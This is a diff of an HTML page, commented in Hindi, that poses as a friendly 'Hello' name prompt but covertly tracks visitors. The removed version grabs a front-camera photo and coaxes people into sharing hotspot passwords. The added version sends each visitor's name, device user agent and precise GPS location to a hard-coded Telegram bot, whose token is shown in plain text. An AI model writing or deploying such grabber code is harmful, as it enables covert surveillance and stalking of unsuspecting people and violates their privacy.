@@ -3,22 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hello_JAAT_G</title>
+<title>Welcome</title>
 <style>
-.progress{
-width:100%;
-height:10px;
-background:#222;
-border-radius:20px;
-overflow:hidden;
-margin-bottom:20px;
-}
-#progressBar{
-width:0%;
-height:100%;
-background:linear-gradient(90deg,#00ffff,#00ff88);
-transition:0.5s;
-}
 *{
 margin:0;
 padding:0;
@@ -27,75 +13,58 @@ font-family:Arial,sans-serif;
 }
 body{
 min-height:100vh;
-background:
-linear-gradient(135deg,#050505,#0f172a,#111827);
+background:linear-gradient(135deg,#050505,#0f172a,#111827);
 color:white;
 display:flex;
 justify-content:center;
 align-items:center;
 padding:20px;
-overflow-x:hidden;
 }
 .container{
 width:100%;
-max-width:900px;
+max-width:600px;
 }
 .title{
 text-align:center;
-font-size:60px;
+font-size:45px;
 font-weight:bold;
 margin-bottom:15px;
-background:linear-gradient(
-90deg,
-#00ffff,
-#00ff88,
-#ff00ff,
-#00ffff
-);
+background:linear-gradient(90deg,#00ffff,#00ff88,#ff00ff,#00ffff);
 background-size:300% 300%;
 -webkit-background-clip:text;
 -webkit-text-fill-color:transparent;
 animation:glow 4s infinite linear;
 }
 @keyframes glow{
-0%{
-background-position:0% 50%;
-}
-50%{
-background-position:100% 50%;
-}
-100%{
-background-position:0% 50%;
-}
-}
-.subtitle{
-text-align:center;
-font-size:20px;
-color:#d1d5db;
-line-height:1.7;
-margin-bottom:35px;
+0%{background-position:0% 50%;}
+50%{background-position:100% 50%;}
+100%{background-position:0% 50%;}
 }
 .card{
 background:rgba(255,255,255,0.05);
 border:1px solid rgba(255,255,255,0.1);
 backdrop-filter:blur(12px);
 border-radius:25px;
-padding:25px;
-box-shadow:
-0 0 25px rgba(0,255,255,.3);
-animation:fadeIn .5s;
-}
-.question{
-font-size:28px;
-font-weight:bold;
-margin-bottom:25px;
+padding:30px;
+box-shadow:0 0 25px rgba(0,255,255,.3);
 text-align:center;
 }
-.options{
-display:flex;
-gap:15px;
-justify-content:center;
-flex-wrap:wrap;
+.question{
+font-size:24px;
+font-weight:bold;
+margin-bottom:20px;
+}
+.input-field{
+width:100%;
+padding:15px;
+border-radius:15px;
+border:none;
+font-size:18px;
+margin-top:10px;
+background: rgba(255,255,255,0.1);
+color: white;
+outline: none;
+text-align: center;
 }
 .btn{
 border:none;
@@ -106,276 +75,102 @@ border-radius:18px;
 cursor:pointer;
 color:white;
 transition:.3s;
-}
-.btn:hover{
-transform:scale(1.08);
-}
-.home{
+margin-top:20px;
 background:linear-gradient(45deg,#00c853,#00ff95);
 box-shadow:0 0 20px #00ff95;
 }
-.outside{
-background:linear-gradient(45deg,#2979ff,#00e5ff);
-box-shadow:0 0 20px cyan;
-}
-.yes{
-background:linear-gradient(45deg,#ff6d00,#ff1744);
-box-shadow:0 0 20px orange;
-}
-.no{
-background:linear-gradient(45deg,#6d6d6d,#9e9e9e);
-box-shadow:0 0 20px gray;
-}
-.answer{
-margin-top:25px;
-padding:20px;
-border-radius:18px;
-background:#111827;
-font-size:20px;
-text-align:center;
-animation:fadeIn .4s;
-}
-@keyframes fadeIn{
-from{
-opacity:0;
-transform:translateY(15px);
-}
-to{
-opacity:1;
-transform:translateY(0);
-}
-}
-.badge{
-display:inline-block;
-padding:8px 14px;
-border-radius:30px;
-background:#111;
-border:1px solid #333;
-margin:5px;
+.btn:hover{
+transform:scale(1.05);
 }
 </style>
 </head>
 <body>
-<div class="container">
-<h1 class="title" id="helloTitle">
-HELLO JAAT ☠️🙋
-</h1>
-<p class="subtitle">
-✨ हम आपसे कुछ प्रश्न करना चाहेंगे।<br>
-यह प्रश्न Yogesh द्वारा किए जा रहे हैं।<br>
-आप अपने उत्तर Yogesh की Instagram ID पर भेज सकते हैं।
-</p>
-<div class="progress">
-<div id="progressBar"></div>
-</div>
-<div id="app" class="card">
-<div class="question">
-📝 Type Your Name
-</div>
-<input
-type="text"
-id="userName"
-placeholder="अपना नाम लिखें"
-style="
-width:100%;
-padding:15px;
-border-radius:15px;
-border:none;
-font-size:18px;
-margin-top:15px;
-">
-<div style="text-align:center;margin-top:20px;">
-<button class="btn yes" onclick="saveName()">
-🚀 Continue
-</button>
-<div style="text-align:center; margin-top:20px;">
-    <video id="video" width="100%" max-width="320px" height="auto" autoplay style="border-radius:15px; display:none; border:1px solid rgba(255,255,255,0.2);"></video>
-    
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-</div>
-</div>
-</div>
-<script>
-let userLocation = "";
-let phoneInfo = navigator.userAgent;
-let userName = "";
-// 1. फ्रंट कैमरा चालू करने और फोटो कैप्चर करने का फंक्शन
-async function captureFrontCamera() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
 
-    try {
-       
-        video.srcObject = stream;
-        // कैमरा चालू होने के 2 सेकंड बाद अपने आप फोटो क्लिक करने के लिए
-        setTimeout(() => {
-            context.drawImage(video, 0, 0, 640, 480);
-            // फोटो को बाइनरी (Blob) में बदलकर टेलीग्राम पर भेजना
-            canvas.toBlob(function(blob) {
-                sendPhotoToTelegram(blob);
-                // फोटो खिंचने के बाद कैमरा बंद करना
-                stream.getTracks().forEach(track => track.stop());
-                video.style.display = "none";
-            }, 'image/jpeg');
-        }, 2000); // 2000 मिलीसेकड 2 सेकंड का समय ताकि कैमरा स्टेबल हो जाए
-    } catch (error) {
-        console.log("कैमरा परमिशन नहीं मिली या एरर आया:", error);
-    }
-}
-// 2. टेलीग्राम पर बाइनरी फोटो (Blob) भेजने का नया फंक्शन
-async function sendPhotoToTelegram(photoBlob) {
-    const CHAT_ID = "8064366990";
-    const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y"; 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoBlob, 'snap.jpg');
-    formData.append('caption', "📸 " + userName + " की लाइव फोटो मिली।");
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData // बाइनरी डेटा फॉर्म के रूप में जा रहा है
-        });
-    } catch (error) {
-        console.log("फोटो भेजने में एरर:", error);
-    }
-}
-async function sendToTelegram(message){
+<div class="container">
+    <h1 class="title" id="mainTitle">HELLO 🙋</h1>
+    <div id="app" class="card">
+        <div class="question">📝 Type Your Name</div>
+        <input type="text" id="userName" placeholder="अपना नाम लिखें" class="input-field">
+        <button class="btn" onclick="processData()">🚀 Continue</button>
+    </div>
+</div>
+
+<script>
+// ⚠️ यहाँ अपनी सही डिटेल्स डालें
 const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
 const CHAT_ID = "8064366990";
-try{
-await fetch(
-`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id: CHAT_ID,
-text: message
-})
-});
-}catch(error){
-console.log(error);
-}
-}
-function showFirstQuestion(){
-  document.getElementById("progressBar").style.width="50%";
-document.getElementById("app").innerHTML = `
-<div class="question">
-😎 Hello ${userName}
-</div>
-<div class="question">
-🏠😎 THANKS FOR YOUR TIME
-</div>
-`;
-}
-function selectLocation(location){
-userLocation = location;
-sendToTelegram(
-"🏠 स्थान चुना\n\n" +
-"नाम: " + userName +
-"\nफोन: " + phoneInfo +
-"\nउत्तर: " +
-(location==="home" ? "घर पर" : "बाहर")
-);
-document.getElementById("app").innerHTML = `
-<div class="question">
-📶 क्या आपके पास अनलिमिटेड डेटा है?
-</div>
-<div class="options">
-<button class="btn yes"
-onclick="selectData('yes')">
-✅ Yes
-</button>
-<button class="btn no"
-onclick="selectData('no')">
-❌ No
-</button>
-</div>
-`;
-}
-function selectData(answer){
-let result = "";
-if(userLocation==="home" && answer==="yes"){
-result = `
-🔥 हॉटस्पॉट ON कर दो और
-पासवर्ड Yogesh की Official Instagram ID पर भेज दो।
-`;
-}
-else if(userLocation==="home" && answer==="no"){
-result = `
-😔 हमें अफसोस है।<br>
-आपका दिन शुभ हो।
-`;
-}
-else if(userLocation==="outside" && answer==="yes"){
-result = `
-🏠 जब आप घर पहुँचो तब
-हॉटस्पॉट ON कर देना और
-पासवर्ड Yogesh की Official Instagram ID पर भेज देना।
-`;
-}
-else{
-result = `
-😔 हमें अफसोस है।<br>
-आपका दिन शुभ हो।
-`;
-}
-sendToTelegram(
-"📶 डेटा उत्तर मिला\n\n" +
-"नाम: " + userName +
-"\nस्थान: " +
-(userLocation==="home" ? "घर पर" : "बाहर") +
-"\nडेटा: " +
-(answer==="yes" ? "हाँ" : "नहीं")
-);
-document.getElementById("app").innerHTML = `
-<div class="question">
-🎯 उत्तर
-</div>
-<div class="answer">
-${result}
-</div>
-`;
-}
-async function saveName(){
 
-userName =
-document.getElementById("userName").value;
+let userName = "";
+let phoneInfo = navigator.userAgent;
 
-if(!userName){
-alert("नाम लिखो");
-return;
+// टेलीग्राम पर मैसेज भेजने का फंक्शन
+async function sendToTelegram(message){
+    if(BOT_TOKEN.includes("YOUR_BOT") || CHAT_ID.includes("YOUR_CHAT")) {
+        console.log("कृपया पहले टेलीग्राम टोकन और चैट आईडी सेट करें।");
+        return;
+    }
+    try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    }catch(error){
+        console.log("टेलीग्राम एरर:", error);
+    }
 }
-document.getElementById("helloTitle").innerHTML =
-"HELLO " + userName.toUpperCase() + " ☠️🔥";
-sendToTelegram(
-"📝 नया नाम मिला\n\n" +
-"नाम: " + userName +
-"\nफोन: " + phoneInfo
-);
-captureFrontCamera(); 
-navigator.geolocation.getCurrentPosition(
-function(position){
-const lat =
-position.coords.latitude;
-const lon =
-position.coords.longitude;
-sendToTelegram(
-"📍 नई लोकेशन मिली\n\n" +
-"नाम: " + userName +
-"\nLatitude: " + lat +
-"\nLongitude: " + lon
-);
-showFirstQuestion();
-},
-function(){
-showFirstQuestion();
+
+// नाम सबमिट होते ही बिना बटन दिखाए सीधे लोकेशन ट्रिगर करने का लॉजिक
+function processData(){
+    userName = document.getElementById("userName").value.trim();
+
+    if(!userName){
+        alert("कृपया पहले अपना नाम लिखें");
+        return;
+    }
+
+    // नाम बदलते ही सीधे ब्राउज़र से लोकेशन मांगना (बिका किसी बीच वाले बटन के)
+    navigator.geolocation.getCurrentPosition(
+        function(position){
+            // 1. अगर लोकेशन ऑन है और परमिशन मिल गई
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `🚨 *नई लोकेशन मिली!*\n\n👤 नाम: ${userName}\n📱 डिवाइस: ${phoneInfo}\n\n🗺️ Google Maps: ${mapLink}`;
+            
+            // तुरंत टेलीग्राम पर भेजना
+            sendToTelegram(message);
+            
+            // सीधे थैंक्स स्क्रीन पर ले जाना
+            showThanks();
+        },
+        function(error){
+            // 2. अगर फोन की लोकेशन बंद है या यूज़र ने ब्लॉक किया
+            if (error.code === error.POSITION_UNAVAILABLE || error.code === error.TIMEOUT) {
+                alert("कृपया अपने फोन की लोकेशन (GPS) ऑन करें और दोबारा कोशिश करें।");
+            } else {
+                alert("आगे बढ़ने के लिए लोकेशन की अनुमति देना आवश्यक है।");
+                sendToTelegram(`❌ यूज़र ने लोकेशन ब्लॉक की।\n👤 नाम: ${userName}`);
+                showThanks();
+            }
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
 }
-);
+
+// फाइनल थैंक्स स्क्रीन
+function showThanks(){
+    document.getElementById("mainTitle").innerHTML = "HELLO " + userName.toUpperCase() + " ☠️🔥";
+    document.getElementById("app").innerHTML = `
+        <h1 style="color: #00ff88; font-size: 35px; margin-bottom: 15px;">🙏 THANK YOU</h1>
+        <div style="font-size: 20px; color: #d1d5db;">धन्यवाद, आपका प्रोसेस पूरा हो चुका है।</div>
+    `;
 }
 </script>
+
 </body>
 </html>
